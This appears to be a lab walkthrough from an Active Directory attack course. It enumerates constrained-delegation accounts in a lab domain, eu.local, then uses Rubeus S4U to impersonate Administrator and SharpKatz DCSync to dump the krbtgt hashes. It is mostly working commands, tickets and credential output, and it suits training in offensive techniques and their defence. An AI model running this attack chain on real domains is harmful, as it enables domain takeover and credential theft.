# Hands-On 23:

```
Enumerate users in the eu.local domain for whom Constrained Delegation is enabled.
Abuse the Delegation to execute DCSync attack against eu.local.
```

## Index of content

  1.[User Enumeration](#user-enumeration)
  
  2.[Abuse Delegation](#abuse-delegation)
  
## User Enumeration

From Target user create anew cmd and execute Invisihell, import module AD Directory
```
PS C:\Users\studentuser17> Get-ADObject -Filter {msDs-AllowedToDelegateTo -ne "$null"} -Properties msDs-AllowedToDelegateTo  -Server eu.local


DistinguishedName        : CN=storagesvc,CN=Users,DC=eu,DC=local
msDs-AllowedToDelegateTo : {time/EU-DC.eu.local/eu.local, time/EU-DC.eu.local, time/EU-DC, time/EU-DC.eu.local/EU...}
Name                     : storagesvc
ObjectClass              : user
ObjectGUID               : 041fedb0-a442-4cdf-af34-6559480a2d74

```
```
PS C:\Users\studentuser17> Get-ADObject -Filter {msDs-AllowedToDelegateTo -ne "$null"} -Properties msDs-AllowedToDelegateTo  -Server eu.local | select -ExpandProperty msDs-AllowedToDelegateTo
time/EU-DC.eu.local/eu.local
time/EU-DC.eu.local
time/EU-DC
time/EU-DC.eu.local/EU
time/EU-DC/EU
nmagent/EU-DC.eu.local/eu.local
nmagent/EU-DC.eu.local
nmagent/EU-DC
nmagent/EU-DC.eu.local/EU
nmagent/EU-DC/EU
```


## Abuse Delegation

Generate hash of user storagesvc obtained in the previous Hands-on with credentials Qwerty@123:
```
C:\Users\studentuser17>C:\AD\Tools\Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Calculate Password Hash(es)

[*] Input password             : Qwerty@123
[*] Input username             : storagesvc
[*] Input domain               : eu.local
[*] Salt                       : EU.LOCALstoragesvc
[*]       rc4_hmac             : 5C76877A9C454CDED58807C20C20AEAC
[*]       aes128_cts_hmac_sha1 : 4A5DDDB19CD631AEE9971FB40A8195B8
[*]       aes256_cts_hmac_sha1 : 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04
[*]       des_cbc_md5          : 7F7C6ED00258DC57

```

Abuse of constrained delegation, for impersonate user administrator on eu-dc.eu.local:
```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/EU-DC.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using rc4_hmac hash: 5C76877A9C454CDED58807C20C20AEAC
[*] Building AS-REQ (w/ preauth) for: 'eu.local\storagesvc'
[*] Using domain controller: 192.168.12.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFXjCCBVqgAwIBBaEDAgEWooIEfTCCBHlhggR1MIIEcaADAgEFoQobCEVVLkxPQ0FMoh0wG6ADAgEC
      oRQwEhsGa3JidGd0GwhldS5sb2NhbKOCBD0wggQ5oAMCARKhAwIBAqKCBCsEggQnnp5jvJtwfN+Pn5JH
      /hDgL+OuQ7mJWFeSYGVjtUn1lC6xVgC4H7jIINxChM5EbGiDuLlf/2ld4c8hc36VePFH/UiR4VwpqcZV
      lRXthFMoTeQSAY0UHVp/WK2sP6Hbf6hggV0TBANr3cjCwCNi0QZvht4PkIspHPuAWHr3VRb2TegOFgOk
      I16i7LmBxgMkqmcPHoQM2EPEzqHorK+Nu98mYuLj0qB3G1xYr0bUJMDPxfu9d9LZzkmDS6OqL39YEktF
      zrays0Oh5x/c1GdnHMqPFMJM4mnCzn2jESTOhrvZmseFyO5qihzAWesBtEWHStzn52caagE4e4JpzDct
      skt2eEUR35cA6mzz3/Kg62QT3hNDlcCmCiiNMKw0/8XkN40QGN5G1b3PrAzuUBpM2oCZCe7CYWFggE7H
      dTXSFOZldp/PYMDnTzZMh/Kkf4GdYiSXEuXAel4fcVBbQ2tEJkE8T7SD3JE5k5rMAUy6bxocX7oTt1ii
      29ZcbK5qNXLetyY2suezRiMi+yDokhHymQqHfK2LXVRlDqUZxJ/Y4rMcIhCgEGscViezvId6U064x9e8
      Vg3lNAeNZR5YAoEOdcRgDnh8RCgo2Bq0pD0ShqdCLWHZbid2XYKsviKvj4tVNfoyNUyDQDdLThosx4q1
      OfotzBSpszpqHw7CpB1KCD+CvRUh/0VReOqZSlW0tEhI9DBBpNg2lnLiCJgIFoKFDlR4hvpEvWD6UWaR
      u8cQc8HL9Itwaua3J8rSS8jPi2B41o1B7YGcj2jq6aPvFjNcfM4gYboIiWwPVN5s5gdU1ObVaOcbc+2g
      c3jyrVAL/+aoZEZETsl+PAY7yKJoZ7OpolMS8bX7AmS4MpC+LgnDFR5AhVlbrR0shp6HFNFo021acble
      7GnqKE/1KC2rlYmzz5naIIWL7QlNesDZyijZMlXHIrAF+4COFeNaHrA8/z5VRYrTjw7GUneGsbziMWh1
      eFta+o29sqWmffcKq46w7rcelbL4gGKqEKROuMBLMS0cMWAskm2jCAK/bkd2Kp0QPGJTBiloFdU7pvWf
      c313JzzLKT/UDvGJfxuOK8SE3vjaAp2j4Ob4wlLw5HVoCyjhokSGVXZzpC6jBuPhOmkolVqd0RGL1Ty3
      Sv4q56jHW9T+i0mMMvfJLbQaEasR68Pnd7dkKf+rzjDx1Sio9prtdkTXLnIZBUBeYVxPJN3DRgkhLHna
      urrcWVQOY/N1kQq5G/r1qxwPdx5oyg4t7hf+7dXXKFBDfLEFGj0OnZf3oNfePpjKR34iDbzbvm4uJ8cT
      Nxxy6SA8dX4oVIUeMUdsImrXigLGJDS2kqTUbFBW+kgwb7Ce3OENUKWqispzP1MTKddohvJ5HwlUxE/L
      C2NWzr0HfNC+OM0pBQJ5BKL9iBp5IRDpPA/8QHX4IqOBzDCByaADAgEAooHBBIG+fYG7MIG4oIG1MIGy
      MIGvoBswGaADAgEXoRIEEHIE0zA+Gaj45LJwH/VavvShChsIRVUuTE9DQUyiFzAVoAMCAQGhDjAMGwpz
      dG9yYWdlc3ZjowcDBQBA4QAApREYDzIwMjMwMzAzMTg0OTE3WqYRGA8yMDIzMDMwNDA0NDkxN1qnERgP
      MjAyMzAzMTAxODQ5MTdaqAobCEVVLkxPQ0FMqR0wG6ADAgECoRQwEhsGa3JidGd0GwhldS5sb2NhbA==


[*] Action: S4U

[*] Building S4U2self request for: 'storagesvc@EU.LOCAL'
[*] Using domain controller: eu-dc.eu.local (192.168.12.1)
[*] Sending S4U2self request to 192.168.12.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'storagesvc@EU.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'nmagent/EU-DC.eu.local'
[*]   Final ticket will be for the alternate service 'ldap'
[*] Building S4U2proxy request for service: 'nmagent/EU-DC.eu.local'
[*] Using domain controller: eu-dc.eu.local (192.168.12.1)
[*] Sending S4U2proxy request to domain controller 192.168.12.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'ldap'
[*] base64(ticket.kirbi) for SPN 'ldap/EU-DC.eu.local':

      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
      AQKhGDAWGwRsZGFwGw5FVS1EQy5ldS5sb2NhbA==
[+] Ticket successfully imported!
```
Verify the imported ticket:
```
C:\Windows\system32>klist

Current LogonId is 0:0x738a20d

Cached Tickets: (1)

#0>     Client: Administrator @ EU.LOCAL
        Server: ldap/EU-DC.eu.local @ EU.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/3/2023 10:49:17 (local)
        End Time:   3/3/2023 20:49:17 (local)
        Renew Time: 3/10/2023 10:49:17 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

Dump the adminsitrator credentials with dcsync attack and obtain the krbtgt kerberos user:
```
C:\Windows\system32>C:\AD\Tools\SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] eu.local will be the domain
[!] eu-dc.eu.local will be the DC server
[!] eu\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/12/2019 11:00:04 PM
[*] Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : 83ac1bab3e98ce6ed70c9d5841341538
[*] ntlm- 0              : 83ac1bab3e98ce6ed70c9d5841341538
[*] lm  - 0              : bcb73c3d2b4005e405ff7399f3ca2bf0
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : a0c1c86edafc0218a106426f2309bafd
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :EU.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d
[*]     aes128_hmac       4096: e2ef89cdbd94d396f63c9aa5b66e16c7
[*]     des_cbc_md5       4096: 92371fe32c9ba208
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :EU.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 92371fe32c9ba208
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 bbd1d8cc9e5001a195c0aea8260dc460
[*]     02 a8a12e010ecbfa9772ffbf94a0c53bbf
[*]     03 5c4ea92171032c3655c6dab468555c1b
[*]     04 bbd1d8cc9e5001a195c0aea8260dc460
[*]     05 a8a12e010ecbfa9772ffbf94a0c53bbf
[*]     06 b0ebda7d1fa949eef7f3618fb745e92d
[*]     07 bbd1d8cc9e5001a195c0aea8260dc460
[*]     08 4f1dd1dc8c185043ea5f588bced2e536
[*]     09 4f1dd1dc8c185043ea5f588bced2e536
[*]     10 388e53f1b4fc51f5f2a046e9a03d15f8
[*]     11 7a7451acdbda7ca3ea2b9c29a5505805
[*]     12 4f1dd1dc8c185043ea5f588bced2e536
[*]     13 40fb8f21d6689dc78cfa977b8678fba0
[*]     14 7a7451acdbda7ca3ea2b9c29a5505805
[*]     15 8c35ff6c675fea1d7fa64405721aba20
[*]     16 8c35ff6c675fea1d7fa64405721aba20
[*]     17 63fb31e1ff838c848d1e0cbaed8c272e
[*]     18 4e60cf1107bbc98e8fbb76499de1dd96
[*]     19 035a4fe85f9cbe04af399507cd09d7eb
[*]     20 6c0a58bf772f0ce23496ac5dc68672f7
[*]     21 726b4122553e3a61b34c5e08ab04006e
[*]     22 726b4122553e3a61b34c5e08ab04006e
[*]     23 b65f6706fbb5f5e370b76c892cbf98dd
[*]     24 2e16efd1ddfe850f2b8f47ccdd5501ff
[*]     25 2e16efd1ddfe850f2b8f47ccdd5501ff
[*]     26 2afde765ea5c02b1a282f63d9a88ab45
[*]     27 756254f63a68f4f0cf34e82d11986474
[*]     28 50ab58d5ae45dc5792e1dc9d5f6945a5
[*]     29 1b252cf7a18c4e6fcceb388e0e2a0ef6
[*]

```
